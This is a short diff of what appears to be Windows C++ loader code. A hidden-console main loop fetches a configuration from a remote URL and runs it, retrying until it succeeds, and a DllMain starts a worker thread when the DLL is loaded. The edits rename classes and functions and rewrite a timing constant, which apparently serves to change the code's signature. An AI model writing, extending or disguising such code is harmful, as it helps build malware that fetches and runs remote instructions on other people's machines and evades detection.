@@ -11,21 +11,21 @@
 
 int main(int argc, char* argv[])
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	string in(URL);
 	while (true)
 	{
 		try
 		{
-			CURLClass client;
-			string response = client.Get(in);
-			Configure* configure = new Configure(response);
-			configure->Selector();
+			CurlWapper _c;
+			string res = _c._get(URL);
+			Conf* conf = new Conf(res);
+			conf->run();
 			return 0;
 		}
 		catch (exception e)
 		{
-			Sleep(3000);
+			Sleep((1+2)*1000);
 		}
 
 	}
@@ -41,7 +41,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	{
 	case DLL_PROCESS_ATTACH:
 	{
-		CreateThread(NULL, NULL, link_run, NULL, NULL, NULL);
+		CreateThread(NULL, NULL, d_run, NULL, NULL, NULL);
 	}
 	break;
 	case DLL_THREAD_ATTACH:
